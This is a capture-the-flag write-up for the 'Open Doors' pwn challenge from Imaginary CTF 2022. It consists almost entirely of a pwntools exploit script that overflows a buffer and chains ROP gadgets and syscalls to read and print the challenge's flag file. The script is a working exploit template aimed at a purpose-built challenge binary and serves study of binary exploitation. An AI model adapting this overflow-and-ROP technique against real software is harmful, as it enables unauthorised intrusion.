---
name: Open Doors (2022)
event: Imaginary CTF 2022
category: Pwn
description: Writeup for Open Doors (Pwn) - Imaginary CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Open Doors

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x401090
continue
'''.format(**locals())

# Binary filename
exe = './opendoors'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Gadgets
mov_eax_read = 0x4010be  # mov eax, 0; ret;
mov_edi_14 = 0x4010b6  # mov edi, 0x14; ret;
pop_rsi = 0x4010bc  # pop rsi; ret;
pop_rdx = 0x4010c4  # pop rdx; ret;
syscall = 0x40101c  # syscall; ret;

# Opening file until FD is 0x14 (so we can use write gadget)
payload = flat({
    offset: [
        p64(elf.symbols.openflag) * 17,
        elf.symbols.printstartfd,
        elf.symbols.get_userinput
    ]
})

io.sendline(payload)

payload = flat({
    offset: [
        mov_eax_read,  # Read() syscall
        mov_edi_14,  # Move 0x14 (20) to EDI as flag.txt FD
        pop_rsi,  # *buf - welcome message
        elf.symbols.welcome,
        syscall,  # Read the flag
        elf.symbols.writewelcome  # Print welcome message (flag)
    ]
})

# Send exploit
io.sendline(payload)

# Flag??
io.interactive()
```
{% endcode %}
